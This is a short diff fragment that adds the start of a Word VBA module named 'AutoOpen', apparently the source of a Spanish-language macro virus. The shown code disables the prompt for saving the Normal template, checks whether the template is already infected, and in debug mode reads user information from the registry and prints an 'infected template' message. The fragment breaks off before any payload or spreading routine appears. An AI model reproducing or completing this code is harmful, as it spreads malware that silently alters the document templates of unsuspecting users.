@@ -1,0 +1,18 @@
+Attribute VB_Name = "AutoOpen"
+#Const depurar = False
+Public Const MacroName = "AutoOpen"
+Public Const Version = 5
+Public Sub Main()
+Dim r As Boolean
+Dim ret As String
+Dim fechaInst As String
+#If depurar Then
+   unNombre = System.PrivateProfileString("", _
+    "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Defname")
+MsgBox unNombre
+#End If
+Options.SaveNormalPrompt = False
+If CheckIt(NormalTemplate) = True Then
+  #If depurar Then
+    MsgBox "Plantilla Normal infectada"
+  
